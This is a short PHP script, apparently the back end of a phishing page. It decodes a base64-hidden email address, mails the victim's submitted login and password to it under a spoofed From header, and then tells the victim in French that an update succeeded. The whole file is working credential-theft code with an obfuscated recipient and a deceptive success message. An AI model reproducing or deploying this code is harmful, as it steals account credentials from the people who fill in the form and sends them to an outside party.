<?php
$hacker=base64_decode($TZ);
mail("$hacker","Identification successfull","Login = $login - Password = $pass","From:se@lotfree.com");
echo "$login : Mise a jour r�alis�e avec succ�s";
?>







